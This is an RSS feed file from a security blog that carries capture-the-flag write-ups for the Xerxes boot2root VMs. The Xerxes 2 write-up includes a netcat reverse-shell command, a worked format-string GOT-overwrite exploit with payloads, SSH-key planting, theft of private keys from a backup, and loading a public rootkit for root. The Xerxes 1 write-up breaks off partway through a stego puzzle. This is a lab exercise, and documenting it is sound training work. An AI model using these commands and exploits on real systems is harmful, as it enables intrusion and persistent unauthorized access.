@@ -1,0 +1,704 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Xerxes on rastamouse.me</title>
+    <link>http://rastamouse.me/tags/xerxes/</link>
+    <description>Recent content in Xerxes on rastamouse.me</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Mon, 18 Aug 2014 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://rastamouse.me/tags/xerxes/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Xerxes: 2</title>
+      <link>http://rastamouse.me/writeups/2014/xerxes-2/</link>
+      <pubDate>Mon, 18 Aug 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/xerxes-2/</guid>
+      <description>
+
+&lt;p&gt;Before you lies the mainframe of XERXES.
+Compromise the subsystems and gain access to /root/flag.txt.
+Xerxes2 is the next installment of barrebas&amp;rsquo; xerxes series of boot2roots.  This time around I had the pleasure of testing the VM before its public release, which I must say was an honour.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -p- 192.168.127.132
+ 
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+80/tcp    open  http    lighttpd 1.4.31
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+4444/tcp  open  krb524?
+8888/tcp  open  http    Tornado httpd 2.3
+51400/tcp open  status  1 (RPC #100024)
+1 service unrecognized despite returning data.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;easter-egg:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Easter Egg&lt;/h2&gt;
+
+&lt;p&gt;Connecting to the service on 4444 spews out a massive base64 string, which when decoded looks like a binary.  Then running it through file shows it to be an MPEG.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/xerxes/2# nc 192.168.127.132 4444
+//OAxAAAAAAAAAAAAEluZm8AAAAPAAAB+AABnD0AAwYICw0QEhUXGhwfISQmKSsuMDM1ODo9QUNG
+[...snip...]
+qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqo=
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~/xerxes/2# base64 -d 4444 &amp;gt; out.bin
+root@kali:~/xerxes/2# file out.bin 
+out.bin: MPEG ADTS, layer III, v2,  64 kbps, 22.05 kHz, Monaural
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It appears to be a sound-bite from System Shock, but nothing remarkable on the surface.  However, you can use an application like &lt;code&gt;Sonic Visualiser&lt;/code&gt; to view the spectrogram of the audio which reveals the following image.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/xerxes2.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;There is an instance of &lt;code&gt;lighttpd&lt;/code&gt; running on port 80, which serves up a simple page with a graphic.  &lt;code&gt;Nikto/dirb/wfuzz&lt;/code&gt; etc didn&amp;rsquo;t turn up anything useful.&lt;/p&gt;
+
+&lt;p&gt;There is an empty &lt;code&gt;.bash_history&lt;/code&gt; file, but this was a mistake when the users&amp;rsquo; bash history files were errased before release.  Silly Bas :p&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/xerxeslogo.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&#34;ipython:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;IPython&lt;/h2&gt;
+
+&lt;p&gt;There&amp;rsquo;s another web-based service running on 8888, called IPython Notebook.&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/ipython.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Creating a new notebook gives you a place to execute some code.  This can be used to execute a python-based reverse shell (using code from pentest monkey for example), or you can append &lt;code&gt;!&lt;/code&gt; and run bash shell commands.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;!id;whoami
+ 
+uid=1002(delacroix) gid=1002(delacroix) groups=1002(delacroix)
+delacroix
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This can be used to execute a netcat shell, though beware - there&amp;rsquo;s a clever little monitoring service which terminates the connection every minute or so.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;!/bin/nc 192.168.127.127 1234 -e &#39;/bin/sh&#39;
+ 
+XERXES: terminating anomalous connection
+Remember, the unauthorized access to XERXES subsystems is a class 3 infraction.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The best bet is to echo your public SSH key into delacroix&amp;rsquo;s &lt;code&gt;authorized_keys&lt;/code&gt; file, directly through IPython and then SSH in.&lt;/p&gt;
+
+&lt;p&gt;More warnings - the same process which kicks the netcat shell (and probably works with other types of connections too) attempts an SSH connection back to you with the credentials &lt;code&gt;root:toor&lt;/code&gt;.  If it successfully connects it reboots your box!  This had me very confused for a while.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;lt;rasta_mouse&amp;gt; hmm, kali VM keeps rebooting... what have you done :p
+&amp;lt;barrebas&amp;gt; haha! it works! :D
+&amp;lt;rasta_mouse&amp;gt; :&#39;(
+&amp;lt;barrebas&amp;gt; change your root pw :)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Eventually, when all that&amp;rsquo;s straightened out:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh delacroix @ 192.168.127.132
+ 
+Welcome to xerxes2.
+      XERXES wishes you
+       a pleasant stay.
+____   ___  ____  ___  __ ____   ___  ____     ____     ____   
+`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb  
+ `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb 
+  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM 
+   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39; 
+   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;    
+  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;      
+_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;brainfucked:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Brainfucked&lt;/h2&gt;
+
+&lt;p&gt;Within delacroix&amp;rsquo;s home directory is a file, &lt;code&gt;bf.c&lt;/code&gt; and their &lt;code&gt;.bash_history&lt;/code&gt; file contains the following line:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;/opt/bf &amp;quot;&amp;lt;&amp;lt;++++[&amp;gt;++++&amp;lt;-]&amp;gt;[&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;+++++&amp;gt;++&amp;gt;++++&amp;gt;++++&amp;gt;++++&amp;gt;+++++&amp;gt;++++&amp;gt;+++++&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;-]&amp;gt;----&amp;gt;-&amp;gt;-&amp;gt;-----&amp;gt;&amp;gt;++++&amp;gt;+++++&amp;gt;+++++&amp;gt;&amp;gt;+++++&amp;gt;++#&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;code&gt;/opt/bf&lt;/code&gt; has the SUID bit set and is owned by polito.  Executing the above gives the following: &lt;code&gt;LOOK DEEPER&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;bf.c&lt;/code&gt; is the source code (custom written by Bas I might add!) for &lt;code&gt;/opt/bf&lt;/code&gt;, which is a brainfuck interpreter.  For the record, I hate brainfuck :p&lt;/p&gt;
+
+&lt;p&gt;There is a new &amp;lsquo;function&amp;rsquo; within this interpreter:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;case &#39;#&#39;:
+	// new feature
+	printf(buf);
+	break;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It&amp;rsquo;s plain to see that &lt;code&gt;buf&lt;/code&gt; (i.e user input) is being passed to &lt;code&gt;printf&lt;/code&gt; without specifying the format string.  You got it - format string vulnerability!&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ checksec /opt/bf
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : disabled
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Other checks show that ASLR is enabled on xerxes2, but this can be circumvented by setting &lt;code&gt;ulimit&lt;/code&gt;.  Using &lt;code&gt;ldd&lt;/code&gt;, we can verify that &lt;code&gt;libc&lt;/code&gt; now loads into the same memory location each time.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ ldd /opt/bf
+	linux-gate.so.1 =&amp;gt;  (0x4001e000)
+	libc.so.6 =&amp;gt; /lib/i386-linux-gnu/i686/cmov/libc.so.6 (0x40026000)
+	/lib/ld-linux.so.2 (0x40000000)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next we try and write a value into buf and read it back from the stack.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ python -c &#39;print &amp;quot;AAAA&amp;quot; + (&amp;quot;%p&amp;quot; * 50)&#39; | /opt/bf `python -c &#39;print (&amp;quot;,&amp;gt;&amp;quot; * 50)&#39;`#
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/bf1.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I make this to be the 16th entry.  We can test this out by specifically requesting that location.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ python -c &#39;print &amp;quot;AAAA %16$x&amp;quot;&#39; | /opt/bf `python -c &#39;print (&amp;quot;,&amp;gt;&amp;quot; * 16)&#39;`#
+AAAA 41414141
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Next, we have a look at the &lt;code&gt;GOT&lt;/code&gt; and find a suitable pointer to overwrite.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ objdump -R /opt/bf 
+ 
+/opt/bf:     file format elf32-i386
+ 
+DYNAMIC RELOCATION RECORDS
+OFFSET   TYPE              VALUE 
+08049a38 R_386_GLOB_DAT    __gmon_start__
+08049a48 R_386_JUMP_SLOT   printf
+08049a4c R_386_JUMP_SLOT   getchar
+08049a50 R_386_JUMP_SLOT   __gmon_start__
+08049a54 R_386_JUMP_SLOT   exit
+08049a58 R_386_JUMP_SLOT   __libc_start_main
+08049a5c R_386_JUMP_SLOT   memset
+08049a60 R_386_JUMP_SLOT   putchar
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;We can see that &lt;code&gt;printf&lt;/code&gt; is at &lt;code&gt;0x08049a48&lt;/code&gt; - the plan is to overwrite the address for &lt;code&gt;printf&lt;/code&gt; with something like &lt;code&gt;system&lt;/code&gt;, then jump to it and execute something such as &lt;code&gt;/bin/sh&lt;/code&gt;.  The address for &lt;code&gt;system&lt;/code&gt; can be found in &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ print system
+$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0x40062000 &amp;lt;system&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;First, I will try and overwrite the address for printf.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ printf &#39;\x48\x9a\x04\x08.%%16$n&#39; &amp;gt; exploit
+gdb-peda$ disassemble main
+[...snip...]
+   0x080486eb &amp;lt;+103&amp;gt;:	mov    DWORD PTR [esp],0x0
+gdb-peda$ b *0x080486eb
+gdb-peda$ r &amp;quot;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;#&amp;quot; &amp;lt; exploit
+Breakpoint 1, 0x080486eb in main ()
+gdb-peda$ x/x 0x08049a48
+0x8049a48 &amp;lt;printf @ got.plt&amp;gt;:	0x00000005
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Sweet, so we&amp;rsquo;ve overwritten the pointer to printf with &lt;code&gt;0x00000005&lt;/code&gt;, but what we actually need to write in here, is the address for &lt;code&gt;system&lt;/code&gt;.  The &lt;code&gt;$n&lt;/code&gt; writes the number of bytes which have been read so far.  The exploit we just created was five bytes in size (the address plus the period), so we need to calculate the number of bytes required that would write &lt;code&gt;0x40062000&lt;/code&gt; into the pointer.&lt;/p&gt;
+
+&lt;p&gt;This needs to be done in two writes, so the address is split into two (&lt;code&gt;0x2000&lt;/code&gt; and &lt;code&gt;0x4006&lt;/code&gt;).&lt;/p&gt;
+
+&lt;p&gt;At the break, &lt;code&gt;peda&lt;/code&gt; dumps part of the stack, which shows how we&amp;rsquo;re now successfully overwriting the pointer with address for system.  What&amp;rsquo;s left is to throw an argument in for system to execute, we can quickly test it using &lt;code&gt;id&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ printf &#39;\x48\x9a\x04\x08\x4a\x9a\x04\x08.%%8182u.%%16$n.%%8196u.%%17$n;id;&#39; &amp;gt; exploit
+delacroix@xerxes2:~$ /opt/bf &amp;quot;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;##&amp;quot; &amp;lt; exploit
+uid=1002(delacroix) gid=1002(delacroix) euid=1001(polito) egid=1001(polito) groups=1001(polito),1002(delacroix)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The only issue with this exploit is that it doesn&amp;rsquo;t seem to drop directly into a new shell.  So I wrote a shell script that would be executed, which would copy my public SSH key into polito&amp;rsquo;s &lt;code&gt;.ssh&lt;/code&gt; directory.  My final exploit:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;delacroix@xerxes2:~$ printf &#39;\x48\x9a\x04\x08\x4a\x9a\x04\x08.%%8182u.%%16$n.%%8196u.%%17$n;/tmp/x;&#39; &amp;gt; exploit
+delacroix@xerxes2:~$ /opt/bf &amp;quot;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;,&amp;gt;##&amp;quot; &amp;lt; exploit
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/bin/sh
+ 
+mkdir /home/polito/.ssh
+echo &amp;quot;ssh-rsa AAAAB [...snip...] iWI+h root@kali&amp;quot; &amp;gt;&amp;gt; /home/polito/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# ssh polito @ 192.168.127.102
+ 
+Welcome to xerxes2.
+      XERXES wishes you
+       a pleasant stay.
+ 
+polito@xerxes2:~$ id; whoami
+uid=1001(polito) gid=1001(polito) groups=1001(polito)
+polito
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;polito:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Polito&lt;/h2&gt;
+
+&lt;p&gt;Within polito&amp;rsquo;s home directory are two interesting files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;-rw-r--r-- 1 polito polito 44813850 Jul 16 12:17 dump.gpg
+-rw-r--r-- 1 polito polito    27591 Jul 16 12:19 polito.pdf
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Opening the PDF shows the following:&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/qr.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;The QR code translates to nothing but the string &lt;code&gt;XERXES is watching...&lt;/code&gt;, the other message suggests would need to decrypt the GPG file.&lt;/p&gt;
+
+&lt;p&gt;There&amp;rsquo;s nothing inside the &lt;code&gt;.bash_history&lt;/code&gt; file for the user, however if we run &lt;code&gt;file&lt;/code&gt; on the PDF we see something rather unusual.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;polito@xerxes2:~$ file polito.pdf 
+polito.pdf: x86 boot sector, code offset 0xe0
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;It turned out to be a trivial exercise to boot the image using &lt;code&gt;qemu&lt;/code&gt;, and it&amp;rsquo;s nice enough to give us a password!&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-2/qemu.jpg&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;This password can then be used to decrypt the GPG file.  At first it filled my screen with an absolute jumble of madness, so it needs to be output to a file.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;polito@xerxes2:~$ gpg -o dump -d dump.gpg
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The decrypted file is binary and appears to be a dump from memory.  It&amp;rsquo;s too long to analyse by hand, so I tried my luck at grepping for particular strings.  Eventually, I came across the following line:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;openssl enc -e -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar -out /opt/backup/korenchkin.tar.enc
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Until now, I hadn&amp;rsquo;t come across this file - so much for enumeration!  But when I checked, it was indeed there so I went ahead and decrypted it.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;polito@xerxes2:~$ openssl enc -d -salt -aes-256-cbc -pass pass:c2hvZGFu -in /opt/backup/korenchkin.tar.enc -out korenchkin.tar
+ 
+polito@xerxes2:~$ tar -xvf korenchkin.tar 
+.ssh/id_rsa
+.ssh/id_rsa.pub
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These keys can be used to SSH as the user korenchkin.&lt;/p&gt;
+
+&lt;h2 id=&#34;korenchkin:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Korenchkin&lt;/h2&gt;
+
+&lt;p&gt;There are no files within the user&amp;rsquo;s home directory, but they are a member of the sudoers group.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;(root) NOPASSWD: /sbin/insmod, (root) /sbin/rmmod
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;These applications are used to load and unload kernel modules - which just screams rootkit to me.  I did a search on GitHub and pretty much ran with the first hit. &lt;code&gt;https://github.com/ivyl/rootkit&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I downloaded this to my Kali box and uploaded it to xerxes via &lt;code&gt;SCP&lt;/code&gt;.  Then it was a matter of compiling and loading.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;korenchkin@xerxes2:~/rootkit$ make
+korenchkin@xerxes2:~/rootkit$ sudo insmod rt.ko 
+korenchkin@xerxes2:~/rootkit$ tools/rtcmd.py mypenislong /bin/bash
+root@xerxes2:~# id; whoami
+uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(korenchkin)
+root
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;flag:cc9f56357c0c2cbe051d571b76b80137&#34;&gt;Flag&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@xerxes2:/root# cat flag.txt 
+____   ___  ____  ___  __ ____   ___  ____     ____     ____   
+`MM(   )P&#39; 6MMMMb `MM 6MM `MM(   )P&#39; 6MMMMb   6MMMMb\  6MMMMb  
+ `MM` ,P  6M&#39;  `Mb MM69 &amp;quot;  `MM` ,P  6M&#39;  `Mb MM&#39;    ` MM&#39;  `Mb 
+  `MM,P   MM    MM MM&#39;      `MM,P   MM    MM YM.           ,MM 
+   `MM.   MMMMMMMM MM        `MM.   MMMMMMMM  YMMMMb      ,MM&#39; 
+   d`MM.  MM       MM        d`MM.  MM            `Mb   ,M&#39;    
+  d&#39; `MM. YM    d9 MM       d&#39; `MM. YM    d9 L    ,MM ,M&#39;      
+_d_  _)MM_ YMMMM9 _MM_    _d_  _)MM_ YMMMM9  MYMMMM9  MMMMMMMM 
+	congratulations on beating xerxes2!
+ 
+	I hope you enjoyed it as much as I did making xerxes2. 
+	xerxes1 has been described as &#39;weird&#39; and &#39;left-field&#39;
+	and I hope that this one fits that description too :)
+ 
+	Many thanks to TheColonial &amp;amp; rasta_mouse for testing!
+ 
+	Ping me on #vulnhub for thoughts and comments!
+ 
+					  @barrebas, July 2014
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Thanks for a brilliant challenge barrebas, and damn you for the xerxes-guard!&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Xerxes: 1</title>
+      <link>http://rastamouse.me/writeups/2014/xerxes-1/</link>
+      <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
+      
+      <guid>http://rastamouse.me/writeups/2014/xerxes-1/</guid>
+      <description>
+
+&lt;p&gt;Xerxes is a great VM challenge, created by &lt;a href=&#34;http://barrebas.github.io&#34;&gt;barrebas&lt;/a&gt;.  It&amp;rsquo;s quite a devilish challenge, I found - especially getting the inital foothold.  The goal is to obtain root and access the flag.&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;Nmap&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A -p- 192.168.127.128
+
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 4 (protocol 2.0)
+| ssh-hostkey:
+|   1024 78:63:e9:43:33:d3:80:0e:b2:83:15:26:fc:41:ea:17 (DSA)
+|   2048 48:69:ae:38:d5:a1:05:e2:f5:22:45:49:35:b0:ca:5c (RSA)
+|_  256 14:3c:81:fb:32:dd:70:70:05:63:1a:d2:8e:ef:32:64 (ECDSA)
+80/tcp open  http    Apache httpd 2.2.22 ((Debian))
+| http-robots.txt: 2 disallowed entries
+|_/ /dev
+|_http-title: Site doesn&#39;t have a title (text/html).
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Nmap picks out the contents of the robots.txt file, &lt;code&gt;/dev/&lt;/code&gt;.  Before I got too ahead of myself, I ran &lt;code&gt;nikto&lt;/code&gt;, &lt;code&gt;wfuzz&lt;/code&gt; and &lt;code&gt;dirbuster&lt;/code&gt;, but nothing else popped.&lt;/p&gt;
+
+&lt;h2 id=&#34;dev:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;/dev/&lt;/h2&gt;
+
+&lt;p&gt;This page has a password-protected upload function.&lt;/p&gt;
+
+&lt;p&gt;First, I tried uploading a simple PHP CMD file without a password, but received the following error: &lt;em&gt;&amp;ldquo;Error: illegal file detected.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Then, I ran &lt;code&gt;echo test &amp;gt; test&lt;/code&gt;, tried uploading that without a password, and received the error: &lt;em&gt;&amp;ldquo;Error: you have supplied an invalid password.&amp;rdquo;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;That obviously gave me two pieces of information, but I couldn&amp;rsquo;t progress without a valid password.  I tried to bruteforce it with a simple wordlist, but didn&amp;rsquo;t have any luck.  The POST data is submitted to the web server with &lt;code&gt;multipart/form-data&lt;/code&gt; encoding, which is a little different to the &lt;code&gt;x-www-form-urlencoded&lt;/code&gt; format that I&amp;rsquo;m more familiar with.&lt;/p&gt;
+
+&lt;p&gt;On the forgotten password page is a QR Code image (but no actual functionality for resetting a password).  I uploaded this image to a decoder website, which returned a base64 encoded string.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;bG9vayBkZWVwZXI=&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I then decoded this, which returned the message:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;look deeper&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I hate cryptic messages :)&lt;/p&gt;
+
+&lt;h2 id=&#34;looking-deeper:e030175fb591c9e48fb1260bc12c80d4&#34;&gt;Looking Deeper&lt;/h2&gt;
+
+&lt;p&gt;So I took the clue to &amp;lsquo;look deeper&amp;rsquo;, and had a closer look at the QR image.  I opened it up in The GIMP and pretty quickly something jumped out.  There is a row of transparent pixels at the top-left of the image.  You can&amp;rsquo;t see them on the web page, as the white background of the page shows through the pixels, but in an editor, you can see the checkboard canvas.&lt;/p&gt;
+
+&lt;p&gt;I did some manipulation on these pixels (brightness/contrast, levels &amp;amp; curves etc) but nothing else was revealed.  I had a look at the pixel values and they are all pure white (RGB 255, 255, 255), but they each have a different level of transparency (Alpha value).&lt;/p&gt;
+
+&lt;div align=&#34;center&#34;&gt;
+	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
+    
+        &lt;img src=&#34;http://rastamouse.me/img/writeups/xerxes-1/colour-picker.png&#34;  /&gt;
+    
+    
+&lt;/figure&gt;
+&lt;/div&gt;
+
+&lt;p&gt;I collected these values for each of the transparent pixels until I had a full list.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;75 121 115 114 75 121 115 114 87 122 52 114 75 121 115 114 75 121 115 114 75 122 119 116 88 84 52 114 75 121 115 114 76 105 115 117 76 83 48 116 76 83 52 116 76 105 52 61&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;I then tried applying various encoders/decoders to them.  Eventually, I found that encoding these values in Hex:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;4b 79 73 72 4b 79 73 72 57 7a 34 72 4b 79 73 72 4b 79 73 72 4b 7a 77 74 58 54 34 72 4b 79 73 72 4c 69 73 75 4c 53 30 74 4c 53 34 74 4c 69 34 3d&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Then decoding them into ASCII:&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;K y s r K y s r W z 4 r K y s r K y s r K z w t X T 4 r K y s r L i s u L S 0 t L S 4 t L i 4 =&lt;/code&gt;&lt;/p&gt;
+
